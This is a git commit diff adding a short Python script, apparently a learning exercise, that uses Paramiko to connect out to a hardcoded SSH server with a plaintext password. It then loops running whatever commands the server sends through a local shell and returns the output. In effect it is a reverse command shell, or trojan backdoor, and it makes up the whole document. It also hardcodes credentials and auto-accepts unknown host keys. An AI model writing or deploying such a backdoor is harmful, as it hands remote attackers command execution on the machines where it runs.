3905bf7d73fd0bcefa293cea8f54a12ee7a276fc
Abdullah Al Mohin Jaki <me.jaki@outlook.com>
2019-05-12 01:53:14 +0600

    create jtro_sshcmd script

--- jTroSSHParmiko/jtro_sshcmd.py
+++ jTroSSHParmiko/jtro_sshcmd.py
@@ -1,1 +1,29 @@
 #!/usr/bin/python3
+import paramiko
+import threading
+import subprocess
+
+
+def ssh_command(ip, user, passwd, command):
+    client = paramiko.SSHClient()
+    # client.load_host_keys('/home/jaki/.ssh/known_host')
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(ip, username=user, password=passwd)
+    ssh_session = client.get_transport().open_session()
+    if ssh_session.active:
+        ssh_session.exec_command(command)
+        print(ssh_session.recv(1024))  # read banner
+        while True:
+            command = ssh_session.recv(1024)  # get the command from the SSH server
+            try:
+                cmd_output = subprocess.check_output(command, shell=True)
+                ssh_session.send(cmd_output)
+            except Exception as e:
+                ssh_session.send(str(e))
+            client.close()
+    return
+
+
+ssh_command('192.168.31.107', 'jaki', 'pythonlover', 'ClientConnected')
+
+
